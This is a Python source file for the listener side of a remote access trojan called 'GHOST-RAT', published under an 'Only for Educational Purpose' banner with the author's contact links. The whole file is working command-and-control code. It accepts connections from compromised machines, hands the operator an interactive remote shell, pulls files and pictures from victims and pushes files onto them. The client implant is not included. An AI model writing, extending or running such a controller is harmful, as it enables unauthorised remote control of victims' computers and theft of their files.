# !}============================================================================{!
# !} [NOTE] Only for Educational Purpose. [/NOTE]                               {!
# !} Author: GhostBoy.                                                          {!
# !} Facebook  : https://www.facebook.com/GhostBoy273/                          {! 
# !} Telegram  : https://t.me/TheBlackH4t                                       {!
# !} Instagram : https://www.instagram.com/ezemtz.2222                          {!
# !} Github    : https://www.github.com/GhostBoy-404                            {!
# !} Lang : Python.                                                             {!
# !} Product Name : GHOST-RAT [ Simple Rython Rat ]                             {!
# !} ~~ A very stable python remote shell ~~                                    {!
# !} [X] Only For Linux And Windows [X]                                         {!
# !} [+] Found any bug. Please contact me drawbox273020@gmail.com :)            {!
# !}============================================================================{!

import socket
import os
import sys
import select
import time
from colorama import Fore

texto = Fore.LIGHTCYAN_EX+ """
+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+               
                                     __                                
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗   ██████╗  █████╗ ████████╗
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝   ██╔══██╗██╔══██╗╚══██╔══╝
██║  ███╗███████║██║   ██║███████╗   ██║█████╗██████╔╝███████║   ██║   
██║   ██║██╔══██║██║   ██║╚════██║   ██║╚════╝██╔══██╗██╔══██║   ██║   
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║      ██║  ██║██║  ██║   ██║   
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
	   GhostBoy - V-1.0                                                             
+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
  """
print(texto)

host = input("host:")
port = int(input("port:"))
clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind((host, port))
c.listen(100)
active = False
clients = []
socks = []
interval = 0.8

print('\nListening for clients.....\n')

while True:
    try:
        c.settimeout(4)
        try:
            s, a = c.accept()
        except socket.timeout:
            continue
        if a:
            s.settimeout(None)
            socks.append(s)
            clients.append(str(a))
        clear()
        print('\nListening for clients....\n')
        if len(clients) > 0:
            for j in range(0, len(clients)):
                print('[' + str((j + 1)) + '] client:' + clients[j] + '\n')
            print('Press ctrl+C to interact with client.')
        time.sleep(interval)
    except KeyboardInterrupt:
        clear()
        print('\nListening for clients....\n')
        if len(clients) > 0:
            for j in range(0, len(clients)):
                print('[' + str((j + 1)) + '] client:' + clients[j] + '\n')
            print("...\n")
            print("[0] Exit \n")
        activate = int(input('\nEnter option.'))
        if activate == 0:
            print('\nExiting....\n')
            sys.exit()
        activate -= 1
        clear()
        print('Activating client.' + clients[activate] + '\n')
        active = True
        socks[activate].send(b'dir')
    while active:
        data = socks[activate].recv(5000)
        print(data)
        if data.startswith(b'Exit'):
            active = False
            print('Press ctrl+c to return to listener mode....')
        else:
            nextcmd = input('shell$ ').encode()
            socks[activate].send(nextcmd)
        if nextcmd.startswith(b"download"):

            downFile = nextcmd[9:].decode()
            try:
                f = open(downFile, 'wb')
                print('Downloading file', downFile)
                while True:
                    l = socks[activate].recv(5000)
                    while 1:
                        if l.endswith(b'EOFEOFX'):
                            u = l[:-7]
                            f.write(u)
                            s.send(b"cls")
                            print("File downloaded")
                            break
                        elif l.startswith(b'EOFEOFX'):
                            break
                        else:
                            f.write(l)
                            l = socks[activate].recv(5000)
                    break
                f.close()
            except:
                pass
            # dir change function
        elif nextcmd.startswith(b"cd"):
            path = nextcmd[3:].decode()

        # upload function
        elif nextcmd.startswith(b"pic"):
            jgp = nextcmd[4:].decode()
            downFile = nextcmd[4:].decode()
            time.sleep(2)
            try:
                f = open(downFile, 'wb')
                print('Downloading file', downFile)
                while True:
                    l = socks[activate].recv(512)
                    while 1:
                        if l.endswith(b'EOFEOFX'):
                            u = l[:-7]
                            f.write(u)
                            s.send(b"cls")
                            print("File downloaded")
                            break
                        elif l.startswith(b'EOFEOFX'):
                            break
                        else:
                            f.write(l)
                            l = socks[activate].recv(5000)
                    break
                f.close()
            except:
                pass
        elif nextcmd.startswith(b"del"):
            file = nextcmd[4:].decode()
        elif len(nextcmd) == 0:
            socks[activate].send(b'dir')

        elif data.startswith(b'invalid'):
            print("Invalid filename")
        # upload system
        elif nextcmd.startswith(b'upload'):
            sendFile = nextcmd[7:].decode()
            time.sleep(.8)
            if os.path.isfile(sendFile):
                with open(sendFile, 'rb') as f:
                    while True:
                        filedata = f.read()
                        if filedata == b'':
                            break
                        socks[activate].sendall(filedata)
                f.close()
                time.sleep(0.8)
                socks[activate].sendall(b'EOFEOFX')
            else:
                print("Failed invalid file")
                socks[activate].send(b'EOFEOFX')
                pass
